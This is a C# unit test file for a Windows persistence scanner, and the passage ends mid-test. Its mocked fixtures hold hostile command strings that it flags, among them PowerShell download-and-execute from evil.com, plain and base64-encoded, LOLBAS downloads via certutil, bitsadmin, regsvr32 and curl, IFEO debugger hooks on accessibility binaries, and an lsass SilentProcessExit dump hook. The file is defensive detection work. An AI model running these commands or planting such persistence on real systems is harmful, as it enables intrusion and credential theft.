// ─────────────────────────────────────────────────────────────────────────────
// LogicFlow.Tests — PersistenceScannerEngineTests
// Exhaustive Unit & Integration Tests for WMI Subscriptions, Scheduled Tasks (LOLBAS),
// IFEO Debugger Hooks, AppInit_DLLs, Winlogon Overrides, and Temp/AppData Binaries.
// ─────────────────────────────────────────────────────────────────────────────

using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using LogicFlow.Sentinel;
using Microsoft.Win32;
using Moq;
using Xunit;

namespace LogicFlow.Tests
{
    public class PersistenceScannerEngineTests
    {
        private readonly Mock<IPersistenceRegistryService> _mockRegistry = new();
        private readonly Mock<IWmiSubscriptionService> _mockWmi = new();
        private readonly Mock<IScheduledTaskService> _mockTaskService = new();
        private readonly Mock<IProcessProvider> _mockProcessProvider = new();
        private readonly Mock<IFileSystemProvider> _mockFileSystem = new();
        private readonly Mock<IDigitalSignatureValidator> _mockSigValidator = new();

        private PersistenceScannerEngine CreateEngine()
        {
            return new PersistenceScannerEngine(
                _mockRegistry.Object,
                _mockWmi.Object,
                _mockTaskService.Object,
                _mockProcessProvider.Object,
                _mockFileSystem.Object,
                _mockSigValidator.Object);
        }

        #region Vector 1: WMI Subscriptions

        [Fact]
        public async Task ScanAsync_DetectsActiveWmiSubscription_CommandLineEventConsumer()
        {
            // Arrange
            var consumers = new List<WmiEventConsumerInfo>
            {
                new()
                {
                    Name = "MaliciousConsumer",
                    ConsumerType = "CommandLineEventConsumer",
                    CommandLineTemplate = "powershell.exe -w hidden -c (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')",
                    RawObjectPath = @"\\.\root\subscription:CommandLineEventConsumer.Name=""MaliciousConsumer"""
                }
            };
            var filters = new List<WmiEventFilterInfo>
            {
                new()
                {
                    Name = "MaliciousFilter",
                    Query = "SELECT * FROM __InstanceCreationEvent WITHIN 15 WHERE TargetInstance ISA 'Win32_LogonSession'",
                    EventNamespace = @"root\cimv2"
                }
            };
            var bindings = new List<WmiBindingInfo>
            {
                new()
                {
                    ConsumerName = "MaliciousConsumer",
                    FilterName = "MaliciousFilter",
                    ConsumerPath = @"CommandLineEventConsumer.Name=""MaliciousConsumer""",
                    FilterPath = @"__EventFilter.Name=""MaliciousFilter"""
                }
            };

            _mockWmi.Setup(w => w.GetConsumers()).Returns(consumers);
            _mockWmi.Setup(w => w.GetFilters()).Returns(filters);
            _mockWmi.Setup(w => w.GetBindings()).Returns(bindings);
            _mockTaskService.Setup(t => t.QueryTasksAsync(It.IsAny<CancellationToken>())).ReturnsAsync(new List<ScheduledTaskInfo>());
            _mockProcessProvider.Setup(p => p.GetRunningProcesses()).Returns(new List<RunningProcessInfo>());
            _mockRegistry.Setup(r => r.GetSubKeyNames(It.IsAny<RegistryHive>(), It.IsAny<RegistryView>(), It.IsAny<string>())).Returns(Array.Empty<string>());

            var engine = CreateEngine();

            // Act
            var report = await engine.ScanAsync();

            // Assert
            Assert.NotNull(report);
            var threat = Assert.Single(report.Threats, t => t.Category == "WMI Persistence");
            Assert.Contains("MaliciousConsumer", threat.Name);
            Assert.Equal(ThreatSeverity.High, threat.Severity);
            Assert.Contains("Active Binding", threat.CommandOrValue != null ? "Active Binding" : "");
            Assert.Equal("WMI", threat.TargetType);
        }

        [Fact]
        public async Task ScanAsync_DetectsActiveWmiSubscription_ActiveScriptEventConsumer()
        {
            // Arrange
            var consumers = new List<WmiEventConsumerInfo>
            {
                new()
                {
                    Name = "ScriptConsumer",
                    ConsumerType = "ActiveScriptEventConsumer",
                    ScriptText = "WScript.CreateObject(\"WScript.Shell\").Run \"calc.exe\"",
                    ScriptingEngine = "VBScript"
                }
            };
            var filters = new List<WmiEventFilterInfo>
            {
                new() { Name = "ScriptFilter", Query = "SELECT * FROM __InstanceModificationEvent" }
            };
            var bindings = new List<WmiBindingInfo>
            {
                new() { ConsumerName = "ScriptConsumer", FilterName = "ScriptFilter" }
            };

            _mockWmi.Setup(w => w.GetConsumers()).Returns(consumers);
            _mockWmi.Setup(w => w.GetFilters()).Returns(filters);
            _mockWmi.Setup(w => w.GetBindings()).Returns(bindings);
            _mockTaskService.Setup(t => t.QueryTasksAsync(It.IsAny<CancellationToken>())).ReturnsAsync(new List<ScheduledTaskInfo>());
            _mockProcessProvider.Setup(p => p.GetRunningProcesses()).Returns(new List<RunningProcessInfo>());
            _mockRegistry.Setup(r => r.GetSubKeyNames(It.IsAny<RegistryHive>(), It.IsAny<RegistryView>(), It.IsAny<string>())).Returns(Array.Empty<string>());

            var engine = CreateEngine();

            // Act
            var report = await engine.ScanAsync();

            // Assert
            var threat = Assert.Single(report.Threats, t => t.Category == "WMI Persistence");
            Assert.Contains("ScriptConsumer", threat.Name);
            Assert.Contains("calc.exe", threat.CommandOrValue);
        }

        [Fact]
        public async Task ScanAsync_DetectsOrphanedWmiConsumerWithPayload()
        {
            // Arrange
            var consumers = new List<WmiEventConsumerInfo>
            {
                new()
                {
                    Name = "OrphanedPayloadConsumer",
                    ConsumerType = "CommandLineEventConsumer",
                    CommandLineTemplate = "cmd.exe /c start evil.exe"
                }
            };

            _mockWmi.Setup(w => w.GetConsumers()).Returns(consumers);
            _mockWmi.Setup(w => w.GetFilters()).Returns(new List<WmiEventFilterInfo>());
            _mockWmi.Setup(w => w.GetBindings()).Returns(new List<WmiBindingInfo>());
            _mockTaskService.Setup(t => t.QueryTasksAsync(It.IsAny<CancellationToken>())).ReturnsAsync(new List<ScheduledTaskInfo>());
            _mockProcessProvider.Setup(p => p.GetRunningProcesses()).Returns(new List<RunningProcessInfo>());
            _mockRegistry.Setup(r => r.GetSubKeyNames(It.IsAny<RegistryHive>(), It.IsAny<RegistryView>(), It.IsAny<string>())).Returns(Array.Empty<string>());

            var engine = CreateEngine();

            // Act
            var report = await engine.ScanAsync();

            // Assert
            var threat = Assert.Single(report.Threats, t => t.Category == "WMI Persistence");
            Assert.Contains("Orphaned WMI Consumer", threat.Name);
            Assert.Equal("cmd.exe /c start evil.exe", threat.CommandOrValue);
        }

        [Fact]
        public async Task ScanAsync_DetectsOrphanedWmiFilter()
        {
            // Arrange
            var filters = new List<WmiEventFilterInfo>
            {
                new() { Name = "RogueCustomFilter", Query = "SELECT * FROM Win32_ProcessStartTrace WHERE ProcessName = 'cmd.exe'" }
            };

            _mockWmi.Setup(w => w.GetConsumers()).Returns(new List<WmiEventConsumerInfo>());
            _mockWmi.Setup(w => w.GetFilters()).Returns(filters);
            _mockWmi.Setup(w => w.GetBindings()).Returns(new List<WmiBindingInfo>());
            _mockTaskService.Setup(t => t.QueryTasksAsync(It.IsAny<CancellationToken>())).ReturnsAsync(new List<ScheduledTaskInfo>());
            _mockProcessProvider.Setup(p => p.GetRunningProcesses()).Returns(new List<RunningProcessInfo>());
            _mockRegistry.Setup(r => r.GetSubKeyNames(It.IsAny<RegistryHive>(), It.IsAny<RegistryView>(), It.IsAny<string>())).Returns(Array.Empty<string>());

            var engine = CreateEngine();

            // Act
            var report = await engine.ScanAsync();

            // Assert
            var threat = Assert.Single(report.Threats, t => t.Category == "WMI Persistence");
            Assert.Contains("Orphaned WMI Filter", threat.Name);
            Assert.Equal(ThreatSeverity.Low, threat.Severity);
        }

        [Fact]
        public async Task ScanAsync_WhitelistsBenignSystemWmiSubscriptions()
        {
            // Arrange
            var consumers = new List<WmiEventConsumerInfo>
            {
                new() { Name = "SCM Event Log Consumer", ConsumerType = "NTEventLogEventConsumer" },
                new() { Name = "Kern-CapLifecycle-Consumer", ConsumerType = "CommandLineEventConsumer", CommandLineTemplate = "system_helper.exe" }
            };
            var filters = new List<WmiEventFilterInfo>
            {
                new() { Name = "SCM Event Log Filter", Query = "SELECT * FROM __InstanceModificationEvent" },
                new() { Name = "Kern-CapLifecycle-Filter", Query = "SELECT * FROM __InstanceCreationEvent" }
            };
            var bindings = new List<WmiBindingInfo>
            {
                new() { ConsumerName = "SCM Event Log Consumer", FilterName = "SCM Event Log Filter" },
                new() { ConsumerName = "Kern-CapLifecycle-Consumer", FilterName = "Kern-CapLifecycle-Filter" }
            };

            _mockWmi.Setup(w => w.GetConsumers()).Returns(consumers);
            _mockWmi.Setup(w => w.GetFilters()).Returns(filters);
            _mockWmi.Setup(w => w.GetBindings()).Returns(bindings);
            _mockTaskService.Setup(t => t.QueryTasksAsync(It.IsAny<CancellationToken>())).ReturnsAsync(new List<ScheduledTaskInfo>());
            _mockProcessProvider.Setup(p => p.GetRunningProcesses()).Returns(new List<RunningProcessInfo>());
            _mockRegistry.Setup(r => r.GetSubKeyNames(It.IsAny<RegistryHive>(), It.IsAny<RegistryView>(), It.IsAny<string>())).Returns(Array.Empty<string>());

            var engine = CreateEngine();

            // Act
            var report = await engine.ScanAsync();

            // Assert
            Assert.Empty(report.Threats.Where(t => t.Category == "WMI Persistence"));
        }

        [Fact]
        public async Task ScanAsync_HandlesWmiAccessDenied_SetsRequiresElevation()
        {
            // Arrange
            _mockWmi.Setup(w => w.GetConsumers()).Throws(new UnauthorizedAccessException("WMI Access Denied"));
            _mockTaskService.Setup(t => t.QueryTasksAsync(It.IsAny<CancellationToken>())).ReturnsAsync(new List<ScheduledTaskInfo>());
            _mockProcessProvider.Setup(p => p.GetRunningProcesses()).Returns(new List<RunningProcessInfo>());
            _mockRegistry.Setup(r => r.GetSubKeyNames(It.IsAny<RegistryHive>(), It.IsAny<RegistryView>(), It.IsAny<string>())).Returns(Array.Empty<string>());

            var engine = CreateEngine();

            // Act
            var report = await engine.ScanAsync();

            // Assert
            Assert.NotNull(report);
            Assert.True(report.RequiresElevation);
        }

        [Fact]
        public async Task RemediateEntryAsync_WmiSubscription_ExecutesSafeCascadeDeletion()
        {
            // Arrange
            var entry = new PersistenceEntry
            {
                Id = "wmi_binding_RogueConsumer_RogueFilter",
                Category = "WMI Persistence",
                Name = "WMI Subscription: RogueConsumer",
                TargetType = "WMI",
                AdditionalData = "RogueConsumer|RogueFilter"
            };

            var engine = CreateEngine();

            // Act
            var result = await engine.RemediateEntryAsync(entry);

            // Assert
            Assert.True(result.Success);
            _mockWmi.Verify(w => w.DeleteBinding("RogueConsumer", "RogueFilter"), Times.Once);
            _mockWmi.Verify(w => w.DeleteConsumer("RogueConsumer"), Times.Once);
            _mockWmi.Verify(w => w.DeleteFilter("RogueFilter"), Times.Once);
        }

        [Fact]
        public async Task RemediateEntryAsync_WmiSubscription_ProtectsWhitelistedSystemConsumer()
        {
            // Arrange
            var entry = new PersistenceEntry
            {
                Id = "wmi_scm",
                Category = "WMI Persistence",
                Name = "SCM Event Log Consumer",
                TargetType = "WMI",
                AdditionalData = "SCM Event Log Consumer|SCM Event Log Filter"
            };

            var engine = CreateEngine();

            // Act
            var result = await engine.RemediateEntryAsync(entry);

            // Assert
            Assert.False(result.Success);
            Assert.Contains("protected Windows system", result.Message);
            _mockWmi.Verify(w => w.DeleteBinding(It.IsAny<string>(), It.IsAny<string>()), Times.Never);
        }

        #endregion

        #region Vector 2: Scheduled Tasks & LOLBAS

        [Fact]
        public async Task ScanAsync_DetectsEncodedPowerShellTask_DecodesBase64AndFlagsCritical()
        {
            // Arrange
            // Encode payload: (New-Object Net.WebClient).DownloadString('http://evil.com/rat.ps1') | IEX
            string rawCommand = "(New-Object Net.WebClient).DownloadString('http://evil.com/rat.ps1') | IEX";
            string b64 = Convert.ToBase64String(Encoding.Unicode.GetBytes(rawCommand));
            string taskAction = $"powershell.exe -enc {b64}";

            var tasks = new List<ScheduledTaskInfo>
            {
                new()
                {
                    TaskName = @"\Updater\AutoUpdateTask",
                    TaskToRun = taskAction,
                    Author = "SYSTEM",
                    HasSecurityDescriptor = true
                }
            };

            _mockWmi.Setup(w => w.GetConsumers()).Returns(new List<WmiEventConsumerInfo>());
            _mockWmi.Setup(w => w.GetFilters()).Returns(new List<WmiEventFilterInfo>());
            _mockWmi.Setup(w => w.GetBindings()).Returns(new List<WmiBindingInfo>());
            _mockTaskService.Setup(t => t.QueryTasksAsync(It.IsAny<CancellationToken>())).ReturnsAsync(tasks);
            _mockProcessProvider.Setup(p => p.GetRunningProcesses()).Returns(new List<RunningProcessInfo>());
            _mockRegistry.Setup(r => r.GetSubKeyNames(It.IsAny<RegistryHive>(), It.IsAny<RegistryView>(), It.IsAny<string>())).Returns(Array.Empty<string>());

            var engine = CreateEngine();

            // Act
            var report = await engine.ScanAsync();

            // Assert
            var threat = Assert.Single(report.Threats, t => t.Category == "LOLBAS Scheduled Task");
            Assert.Equal(ThreatSeverity.Critical, threat.Severity);
            Assert.Contains("Encoded PowerShell Task", threat.Name);
            Assert.Contains("DownloadString", threat.CommandOrValue);
        }

        [Theory]
        [InlineData(@"mshta.exe vbscript:Close(Execute(""CreateObject(""""Wscript.Shell"""").Run """"calc.exe"""",0,False)""))", "mshta")]
        [InlineData(@"wscript.exe C:\Users\Public\script.vbs", "wscript")]
        [InlineData(@"cscript.exe //nologo C:\Temp\run.js", "cscript")]
        [InlineData(@"certutil.exe -urlcache -split -f http://evil.com/test.exe C:\Temp\test.exe", "certutil")]
        [InlineData(@"bitsadmin.exe /transfer myJob /download /priority normal http://evil.com/p.exe C:\Temp\p.exe", "bitsadmin")]
        [InlineData(@"rundll32.exe C:\Temp\payload.dll,DllRegisterServer", "rundll32")]
        [InlineData(@"regsvr32.exe /s /u /i:http://evil.com/test.sct scrobj.dll", "regsvr32")]
        [InlineData(@"curl.exe -o C:\Temp\out.exe http://evil.com/dropper.exe", "curl")]
        [InlineData(@"powershell.exe -w hidden -noprofile -file C:\Temp\stealth.ps1", "powershell (hidden)")]
        public async Task ScanAsync_DetectsLolbasTaskTriggers_MshtaWscriptCertutil(string action, string expectedTool)
        {
            // Arrange
            var tasks = new List<ScheduledTaskInfo>
            {
                new()
                {
                    TaskName = @"\Test\LolbasTask",
                    TaskToRun = action,
                    HasSecurityDescriptor = true
                }
            };

            _mockWmi.Setup(w => w.GetConsumers()).Returns(new List<WmiEventConsumerInfo>());
            _mockWmi.Setup(w => w.GetFilters()).Returns(new List<WmiEventFilterInfo>());
            _mockWmi.Setup(w => w.GetBindings()).Returns(new List<WmiBindingInfo>());
            _mockTaskService.Setup(t => t.QueryTasksAsync(It.IsAny<CancellationToken>())).ReturnsAsync(tasks);
            _mockProcessProvider.Setup(p => p.GetRunningProcesses()).Returns(new List<RunningProcessInfo>());
            _mockRegistry.Setup(r => r.GetSubKeyNames(It.IsAny<RegistryHive>(), It.IsAny<RegistryView>(), It.IsAny<string>())).Returns(Array.Empty<string>());

            var engine = CreateEngine();

            // Act
            var report = await engine.ScanAsync();

            // Assert
            var threat = Assert.Single(report.Threats, t => t.Category == "LOLBAS Scheduled Task");
            Assert.Contains(expectedTool, threat.Name);
            Assert.Equal(ThreatSeverity.High, threat.Severity);
        }

        [Fact]
        public async Task ScanAsync_DetectsUnquotedExecutablePathInUserDirectory()
        {
            // Arrange
            var tasks = new List<ScheduledTaskInfo>
            {
                new()
                {
                    TaskName = @"\Vulnerable\UnquotedTask",
                    TaskToRun = @"C:\Users\John Doe\AppData\Local\My App\launcher.exe -silent",
                    HasSecurityDescriptor = true
                }
            };

            _mockWmi.Setup(w => w.GetConsumers()).Returns(new List<WmiEventConsumerInfo>());
            _mockWmi.Setup(w => w.GetFilters()).Returns(new List<WmiEventFilterInfo>());
            _mockWmi.Setup(w => w.GetBindings()).Returns(new List<WmiBindingInfo>());
            _mockTaskService.Setup(t => t.QueryTasksAsync(It.IsAny<CancellationToken>())).ReturnsAsync(tasks);
            _mockProcessProvider.Setup(p => p.GetRunningProcesses()).Returns(new List<RunningProcessInfo>());
            _mockRegistry.Setup(r => r.GetSubKeyNames(It.IsAny<RegistryHive>(), It.IsAny<RegistryView>(), It.IsAny<string>())).Returns(Array.Empty<string>());

            var engine = CreateEngine();

            // Act
            var report = await engine.ScanAsync();

            // Assert
            var threat = Assert.Single(report.Threats, t => t.Category == "Vulnerable Scheduled Task");
            Assert.Contains("Unquoted Path in User Space", threat.Name);
            Assert.Equal(ThreatSeverity.High, threat.Severity);
        }

        [Fact]
        public async Task ScanAsync_DetectsGhostTask_WithMissingSecurityDescriptor()
        {
            // Arrange
            var tasks = new List<ScheduledTaskInfo>
            {
                new()
                {
                    TaskName = @"\Stealth\GhostTask01",
                    TaskToRun = "cmd.exe /c run.bat",
                    HasSecurityDescriptor = false
                }
            };

            _mockWmi.Setup(w => w.GetConsumers()).Returns(new List<WmiEventConsumerInfo>());
            _mockWmi.Setup(w => w.GetFilters()).Returns(new List<WmiEventFilterInfo>());
            _mockWmi.Setup(w => w.GetBindings()).Returns(new List<WmiBindingInfo>());
            _mockTaskService.Setup(t => t.QueryTasksAsync(It.IsAny<CancellationToken>())).ReturnsAsync(tasks);
            _mockProcessProvider.Setup(p => p.GetRunningProcesses()).Returns(new List<RunningProcessInfo>());
            _mockRegistry.Setup(r => r.GetSubKeyNames(It.IsAny<RegistryHive>(), It.IsAny<RegistryView>(), It.IsAny<string>())).Returns(Array.Empty<string>());

            var engine = CreateEngine();

            // Act
            var report = await engine.ScanAsync();

            // Assert
            var threat = Assert.Single(report.Threats, t => t.Category == "Ghost Scheduled Task");
            Assert.Equal(ThreatSeverity.Critical, threat.Severity);
            Assert.Contains("Ghost Task", threat.Name);
        }

        [Theory]
        [InlineData("\"Nombre de la tarea\",\"Hora próxima ejecución\",\"Estado\",\"Tarea a ejecutar\"\r\n\"\\Prueba\",\"N/A\",\"Listo\",\"calc.exe\"", "\\Prueba", "calc.exe")]
        [InlineData("\"Aufgabenname\",\"Nächste Laufzeit\",\"Status\",\"Auszuführende Aufgabe\"\r\n\"\\TestTaskDE\",\"N/A\",\"Bereit\",\"notepad.exe\"", "\\TestTaskDE", "notepad.exe")]
        [InlineData("\"Nom de la tâche\",\"Prochaine exécution\",\"Statut\",\"Action\"\r\n\"\\TacheFR\",\"N/A\",\"Prêt\",\"cmd.exe\"", "\\TacheFR", "cmd.exe")]
        public void ParseSchtasksCsv_CorrectlyParsesMultilingualHeaders_SpanishGermanFrench(string csv, string expectedName, string expectedAction)
        {
            // Act
            var tasks = WindowsScheduledTaskService.ParseSchtasksCsv(csv);

            // Assert
            var task = Assert.Single(tasks);
            Assert.Equal(expectedName, task.TaskName);
            Assert.Equal(expectedAction, task.TaskToRun);
        }

        [Fact]
        public void ParseSchtasksCsv_HandlesMultilineQuotedDescriptions()
        {
            // Arrange
            string csv = "\"TaskName\",\"Task To Run\",\"Comment\"\r\n\"\\MultilineTask\",\"powershell.exe -c test\",\"Line 1 of description\r\nLine 2 with comma, and more text\r\nLine 3\"";

            // Act
            var tasks = WindowsScheduledTaskService.ParseSchtasksCsv(csv);

            // Assert
            var task = Assert.Single(tasks);
            Assert.Equal(@"\MultilineTask", task.TaskName);
            Assert.Equal("powershell.exe -c test", task.TaskToRun);
        }

        [Fact]
        public async Task RemediateEntryAsync_ScheduledTask_DeletesTaskSuccessfully()
        {
            // Arrange
            var entry = new PersistenceEntry
            {
                Id = "task_bad",
                Category = "LOLBAS Scheduled Task",
                Name = "Bad Task",
                Location = @"\Evil\PersistenceTask",
                TargetType = "Task",
                AdditionalData = @"\Evil\PersistenceTask"
            };

            _mockTaskService.Setup(t => t.DeleteTaskAsync(@"\Evil\PersistenceTask", It.IsAny<CancellationToken>())).ReturnsAsync(true);

            var engine = CreateEngine();

            // Act
            var result = await engine.RemediateEntryAsync(entry);

            // Assert
            Assert.True(result.Success);
            _mockTaskService.Verify(t => t.DeleteTaskAsync(@"\Evil\PersistenceTask", It.IsAny<CancellationToken>()), Times.Once);
        }

        [Fact]
        public async Task RemediateEntryAsync_ScheduledTask_ProtectsCoreWindowsTasks()
        {
            // Arrange
            var entry = new PersistenceEntry
            {
                Id = "task_sys",
                Category = "LOLBAS Scheduled Task",
                Name = "Core Windows Task",
                Location = @"\Microsoft\Windows\Defrag\ScheduledDefrag",
                TargetType = "Task",
                AdditionalData = @"\Microsoft\Windows\Defrag\ScheduledDefrag"
            };

            var engine = CreateEngine();

            // Act
            var result = await engine.RemediateEntryAsync(entry);

            // Assert
            Assert.False(result.Success);
            Assert.Contains("protected Windows core", result.Message);
            _mockTaskService.Verify(t => t.DeleteTaskAsync(It.IsAny<string>(), It.IsAny<CancellationToken>()), Times.Never);
        }

        #endregion

        #region Vector 3: IFEO, AppInit & Winlogon

        [Theory]
        [InlineData("sethc.exe")]
        [InlineData("utilman.exe")]
        [InlineData("osk.exe")]
        [InlineData("taskmgr.exe")]
        [InlineData("magnify.exe")]
        [InlineData("narrator.exe")]
        [InlineData("displayswitch.exe")]
        [InlineData("AtBroker.exe")]
        public async Task ScanAsync_DetectsIfeoDebuggerHook_OnAllAccessibilityBinaries(string binaryName)
        {
            // Arrange
            string ifeoKey = @"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options";
            _mockRegistry.Setup(r => r.GetSubKeyNames(RegistryHive.LocalMachine, RegistryView.Registry64, ifeoKey))
                .Returns(new[] { binaryName });
            _mockRegistry.Setup(r => r.GetString(RegistryHive.LocalMachine, RegistryView.Registry64, $@"{ifeoKey}\{binaryName}", "Debugger"))
                .Returns(@"C:\Windows\System32\cmd.exe");

            _mockWmi.Setup(w => w.GetConsumers()).Returns(new List<WmiEventConsumerInfo>());
            _mockWmi.Setup(w => w.GetFilters()).Returns(new List<WmiEventFilterInfo>());
            _mockWmi.Setup(w => w.GetBindings()).Returns(new List<WmiBindingInfo>());
            _mockTaskService.Setup(t => t.QueryTasksAsync(It.IsAny<CancellationToken>())).ReturnsAsync(new List<ScheduledTaskInfo>());
            _mockProcessProvider.Setup(p => p.GetRunningProcesses()).Returns(new List<RunningProcessInfo>());

            var engine = CreateEngine();

            // Act
            var report = await engine.ScanAsync();

            // Assert
            var threat = Assert.Single(report.Threats, t => t.Category == "IFEO Hijack");
            Assert.Equal(ThreatSeverity.Critical, threat.Severity);
            Assert.Contains(binaryName, threat.Name);
            Assert.Equal(@"C:\Windows\System32\cmd.exe", threat.CommandOrValue);
        }

        [Fact]
        public async Task ScanAsync_DetectsIfeoDebugger_AcrossBoth64And32BitRegistryViews()
        {
            // Arrange
            string ifeoKey = @"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options";

            // 64-bit hive has notepad.exe hook
            _mockRegistry.Setup(r => r.GetSubKeyNames(RegistryHive.LocalMachine, RegistryView.Registry64, ifeoKey))
                .Returns(new[] { "notepad.exe" });
            _mockRegistry.Setup(r => r.GetString(RegistryHive.LocalMachine, RegistryView.Registry64, $@"{ifeoKey}\notepad.exe", "Debugger"))
                .Returns(@"C:\Evil\hook64.exe");

            // 32-bit hive has calc.exe hook
            _mockRegistry.Setup(r => r.GetSubKeyNames(RegistryHive.LocalMachine, RegistryView.Registry32, ifeoKey))
                .Returns(new[] { "calc.exe" });
            _mockRegistry.Setup(r => r.GetString(RegistryHive.LocalMachine, RegistryView.Registry32, $@"{ifeoKey}\calc.exe", "Debugger"))
                .Returns(@"C:\Evil\hook32.exe");

            _mockWmi.Setup(w => w.GetConsumers()).Returns(new List<WmiEventConsumerInfo>());
            _mockWmi.Setup(w => w.GetFilters()).Returns(new List<WmiEventFilterInfo>());
            _mockWmi.Setup(w => w.GetBindings()).Returns(new List<WmiBindingInfo>());
            _mockTaskService.Setup(t => t.QueryTasksAsync(It.IsAny<CancellationToken>())).ReturnsAsync(new List<ScheduledTaskInfo>());
            _mockProcessProvider.Setup(p => p.GetRunningProcesses()).Returns(new List<RunningProcessInfo>());

            var engine = CreateEngine();

            // Act
            var report = await engine.ScanAsync();

            // Assert
            var ifeoThreats = report.Threats.Where(t => t.Category == "IFEO Hijack").ToList();
            Assert.Equal(2, ifeoThreats.Count);
            Assert.Contains(ifeoThreats, t => t.CommandOrValue == @"C:\Evil\hook64.exe" && t.Name.Contains("64-bit"));
            Assert.Contains(ifeoThreats, t => t.CommandOrValue == @"C:\Evil\hook32.exe" && t.Name.Contains("32-bit WOW64"));
        }

        [Fact]
        public async Task ScanAsync_DetectsSilentProcessExit_MonitorProcess()
        {
            // Arrange
            string ifeoKey = @"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options";
            string silentKey = @"SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\lsass.exe";

            _mockRegistry.Setup(r => r.GetSubKeyNames(RegistryHive.LocalMachine, RegistryView.Registry64, ifeoKey))
                .Returns(new[] { "lsass.exe" });
            _mockRegistry.Setup(r => r.GetDword(RegistryHive.LocalMachine, RegistryView.Registry64, $@"{ifeoKey}\lsass.exe", "GlobalFlag"))
                .Returns(0x200); // FLG_MONITOR_SILENT_PROCESS_EXIT
            _mockRegistry.Setup(r => r.GetString(RegistryHive.LocalMachine, RegistryView.Registry64, silentKey, "MonitorProcess"))
                .Returns(@"C:\Temp\dump_lsass.bat");

            _mockWmi.Setup(w => w.GetConsumers()).Returns(new List<WmiEventConsumerInfo>());
            _mockWmi.Setup(w => w.GetFilters()).Returns(new List<WmiEventFilterInfo>());
            _mockWmi.Setup(w => w.GetBindings()).Returns(new List<WmiBindingInfo>());
            _mockTaskService.Setup(t => t.QueryTasksAsync(It.IsAny<CancellationToken>())).ReturnsAsync(new List<ScheduledTaskInfo>());
            _mockProcessProvider.Setup(p => p.GetRunningProcesses()).Returns(new List<RunningProcessInfo>());

            var engine = CreateEngine();

            // Act
            var report = await engine.ScanAsync();

            // Assert
            var threat = Assert.Single(report.Threats, t => t.Category == "SilentProcessExit Hijack");
            Assert.Equal(ThreatSeverity.Critical, threat.Severity);
            Assert.Contains("lsass.exe", threat.Name);
            Assert.Equal(@"C:\Temp\dump_lsass.bat", threat.CommandOrValue);
        }

        [Fact]
        public async Task ScanAsync_DetectsAppInitDlls_ActiveAndDormant()
        {
            // Arrange
            string winPath = @"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows";

            // 64-bit hive: Active AppInit
            _mockRegistry.Setup(r => r.GetString(RegistryHive.LocalMachine, RegistryView.Registry64, winPath, "AppInit_DLLs"))
                .Returns(@"C:\Windows\System32\malicious.dll");
            _mockRegistry.Setup(r => r.GetDword(RegistryHive.LocalMachine, RegistryView.Registry64, winPath, "LoadAppInit_DLLs"))
                .Returns(1);

            // 32-bit hive: Dormant AppInit
            _mockRegistry.Setup(r => r.GetString(RegistryHive.LocalMachine, RegistryView.Registry32, winPath, "AppInit_DLLs"))
                .Returns(@"C:\Windows\SysWOW64\dormant.dll");
            _mockRegistry.Setup(r => r.GetDword(RegistryHive.LocalMachine, RegistryView.Registry32, winPath, "LoadAppInit_DLLs"))
                .Returns(0);

            _mockWmi.Setup(w => w.GetConsumers()).Returns(new List<WmiEventConsumerInfo>());
            _mockWmi.Setup(w => w.GetFilters()).Returns(new List<WmiEventFilterInfo>());
            _mockWmi.Setup(w => w.GetBindings()).Returns(new List<WmiBindingInfo>());
            _mockTaskService.Setup(t => t.QueryTasksAsync(It.IsAny<CancellationToken>())).ReturnsAsync(new List<ScheduledTaskInfo>());
            _mockProcessProvider.Setup(p => p.GetRunningProcesses()).Returns(new List<RunningProcessInfo>());

            var engine = CreateEngine();

            // Act
            var report = await engine.ScanAsync();

            // Assert
            var appInitThreats = report.Threats.Where(t => t.Category == "DLL Injection").ToList();
            Assert.Equal(2, appInitThreats.Count);

            var active = Assert.Single(appInitThreats, t => t.Name.Contains("Active"));
            Assert.Equal(ThreatSeverity.Critical, active.Severity);

            var dormant = Assert.Single(appInitThreats, t => t.Name.Contains("Dormant"));
            Assert.Equal(ThreatSeverity.Medium, dormant.Severity);
        }

        [Fact]
        public async Task ScanAsync_DetectsWinlogonShellAndUserinitOverrides()
        {
            // Arrange
            string winlogonPath = @"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon";
            _mockRegistry.Setup(r => r.GetString(RegistryHive.LocalMachine, RegistryView.Registry64, winlogonPath, "Shell"))
                .Returns(@"C:\Evil\evil_shell.exe");
            _mockRegistry.Setup(r => r.GetString(RegistryHive.LocalMachine, RegistryView.Registry64, winlogonPath, "Userinit"))
                .Returns(@"C:\Evil\evil_userinit.exe,");

            _mockWmi.Setup(w => w.GetConsumers()).Returns(new List<WmiEventConsumerInfo>());
            _mockWmi.Setup(w => w.GetFilters()).Returns(new List<WmiEventFilterInfo>());
            _mockWmi.Setup(w => w.GetBindings()).Returns(new List<WmiBindingInfo>());
            _mockTaskService.Setup(t => t.QueryTasksAsync(It.IsAny<CancellationToken>())).ReturnsAsync(new List<ScheduledTaskInfo>());
            _mockProcessProvider.Setup(p => p.GetRunningProcesses()).Returns(new List<RunningProcessInfo>());

            var engine = CreateEngine();

            // Act
            var report = await engine.ScanAsync();

            // Assert
            var winlogonThreats = report.Threats.Where(t => t.Category == "Winlogon Hijack").ToList();
            Assert.Equal(2, winlogonThreats.Count);
            Assert.All(winlogonThreats, t => Assert.Equal(ThreatSeverity.Critical, t.Severity));
        }

        [Fact]
        public async Task RemediateEntryAsync_IfeoHook_DeletesDebuggerAndSilentExitKeysAcrossViews()
        {
            // Arrange
            var entry = new PersistenceEntry
            {
                Id = "ifeo_sethc.exe",
                Category = "IFEO Hijack",
                Name = "Debugger Hook on sethc.exe",
                TargetType = "IFEO",
                AdditionalData = "sethc.exe|Registry64"
            };

            var engine = CreateEngine();

            // Act
            var result = await engine.RemediateEntryAsync(entry);

            // Assert
            Assert.True(result.Success);
            _mockRegistry.Verify(r => r.DeleteValue(RegistryHive.LocalMachine, RegistryView.Registry64, @"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe", "Debugger"), Times.Once);
